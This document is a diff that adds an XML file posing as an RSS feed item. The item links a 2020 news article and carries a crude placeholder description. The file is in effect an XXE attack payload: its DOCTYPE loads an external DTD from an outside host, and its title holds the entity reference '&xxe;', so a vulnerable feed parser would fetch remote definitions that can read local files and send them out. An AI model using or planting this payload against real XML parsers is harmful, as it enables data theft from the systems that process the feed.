@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo SYSTEM "https://xmltime.imfast.io/note.dtd">
+<rss>    
+    <channel>    
+        <item>
+			<creator>
+			</creator>
+			<description>
+				Chortle my Balls, chin yang
+			</description>
+			<guid isPermaLink="false">
+				p55b85
+			</guid>
+			<link>
+				https://www.smh.com.au/world/north-america/bill-gates-calls-for-covid-19-meds-to-go-to-people-who-need-them-not-highest-bidder-20200711-p55b85.html?ref=rss&amp;utm_medium=rss&amp;utm_source=rss_feed
+			</link>
+			<pubDate>
+				Sat, 11 Jul 2020 20:47:11 +1000
+			</pubDate>
+			<title>
+				&xxe;
+			</title>
+		</item>
+    </channel>
+</rss> 
